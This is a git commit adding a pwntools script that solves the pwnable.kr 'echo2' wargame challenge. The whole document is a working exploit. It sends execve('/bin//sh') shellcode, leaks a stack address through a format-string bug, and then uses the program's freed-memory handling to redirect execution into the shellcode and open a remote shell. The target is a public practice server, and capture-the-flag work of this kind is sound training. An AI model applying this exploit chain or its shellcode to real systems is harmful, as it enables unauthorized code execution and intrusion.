e73dc0380df00ee3523bf535a010948893319cd3
zeredy879 <903796007@qq.com>
2022-08-20 17:05:35 +0800

    echo2 solved

---
+++ pwnable_kr/echo2/sol.py
@@ -0,0 +1,26 @@
+from pwn import *
+
+context(log_level="debug", arch="amd64", os="linux")
+
+shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
+# r = process("./echo2")
+r = remote("pwnable.kr", 9011)
+r.recvuntil(b": ")
+r.sendline(shellcode)
+r.recvuntil(b"> ")
+r.sendline(b"2")
+r.sendline(b"%10$p")
+r.recvline()
+rbp = int(r.recvline().strip(), 16)
+# print(hex(rbp))
+name = rbp - 0x20
+r.recvuntil(b"> ")
+r.sendline(b"4")
+r.recvuntil(b"(y/n)")
+r.sendline(b"n")
+r.recvuntil(b"> ")
+r.sendline(b"3")
+r.sendline(cyclic(0x18) + p64(name))
+r.recvuntil(b"> ")
+r.sendline(b"3")
+r.interactive()
